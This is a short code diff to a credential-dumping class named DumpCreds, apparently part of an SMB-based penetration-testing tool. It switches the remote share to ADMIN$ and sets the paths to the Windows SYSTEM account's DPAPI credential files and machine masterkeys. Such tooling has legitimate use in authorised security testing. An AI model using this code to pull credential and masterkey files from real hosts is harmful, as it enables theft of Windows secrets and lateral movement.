@@ -186,9 +186,9 @@ class DumpCreds:
                         raise
 
                 # get SYSTEM credentials (if requested) & masterkeys
-                share = 'C$'
-                cred_path = '\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Credentials\\'
-                mk_path = '\\Windows\\System32\\Microsoft\\Protect\\S-1-5-18\\User\\'
+                share = 'ADMIN$'
+                cred_path = '\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Credentials\\'
+                mk_path = '\\System32\\Microsoft\\Protect\\S-1-5-18\\User\\'
                 tid = self.__smbConnection.connectTree(share)
 
                 if self.get_creds:
